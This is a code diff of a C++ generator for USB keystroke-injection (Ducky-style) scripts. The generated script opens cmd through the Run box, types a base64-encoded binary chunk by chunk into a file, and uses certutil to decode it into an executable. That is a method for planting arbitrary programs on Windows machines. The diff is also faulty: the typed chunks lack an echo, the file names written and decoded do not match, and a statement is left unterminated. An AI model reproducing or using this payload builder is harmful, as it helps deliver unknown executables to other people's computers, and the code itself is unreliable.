@@ -38,15 +38,30 @@ int main(int argc, char* argv[]) {
     //split b64 str into 50 char chunks
     vector<string> chunks = split(base64_string, 50);
 
+    output_file << "GUI r" << endl;
+    output_file << "DELAY 1000" << endl;
+    output_file << "STRING cmd" << endl;
+    output_file << "DELAY 1000" << endl;
+    output_file << "ENTER" << endl;
+    output_file << "DELAY 4000" << endl << endl;
+
     //is it better to append chunks to file via cli as a one-liner or incrementally?
-    //for now, incrementally seems best
-    for (const string& chunk : chunks) {
+    /*for (const string& chunk : chunks) {
         output_file << "STRING " << chunk << " >> txt.b64" << endl; //standardize temp file name?
         output_file << "DELAY 350" << endl;
         output_file << "ENTER" << endl;
         output_file << "DELAY 350" << endl;
-    }
+    }*/
 
+    for (const string& chunk : chunks) {
+        output_file << "STRING " << chunk << endl; 
+        output_file << "DELAY 350" << endl;
+    }
+    output_file << "STRING >> bin.b64" << endl << "ENTER" << endl << "DELAY 1000" << endl;
+
+    //certutil decode binary, output to exe
+    output_file << "STRING certutil -decode 'c.b64' 'bin.exe'" << endl;
+    output_file << "ENTER"
     output_file.close();
 
     return 0;
